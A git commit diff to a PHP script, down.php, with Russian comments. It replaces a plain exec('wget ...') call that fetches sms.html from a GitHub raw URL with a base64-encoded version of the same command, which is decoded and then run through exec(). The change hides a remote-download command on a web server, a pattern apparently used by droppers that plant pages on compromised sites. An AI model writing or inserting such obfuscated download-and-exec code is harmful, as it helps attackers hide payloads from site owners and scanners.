5ce30ef593ef5ef5ce55213d443ddc6f66f0aa1e
Ro0TiK <s.mayersophie1997@gmail.com>
2024-09-06 18:11:44 +0300

    Update down.php

--- down.php
+++ down.php
@@ -1,4 +1,10 @@
 <?php
-// Выполняем команду wget
-exec('wget https://raw.githubusercontent.com/Ro0TiK/mywebsi/main/sms.html');
+// Закодированная команда 'wget https://raw.githubusercontent.com/Ro0TiK/mywebsi/main/sms.html'
+$encoded_command = 'd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUm8wVGlLL215d2Vic2kvbWFpbi9zbXMuaHRtbA==';
+
+// Декодируем команду
+$decoded_command = base64_decode($encoded_command);
+
+// Выполняем команду
+exec($decoded_command);
 ?>
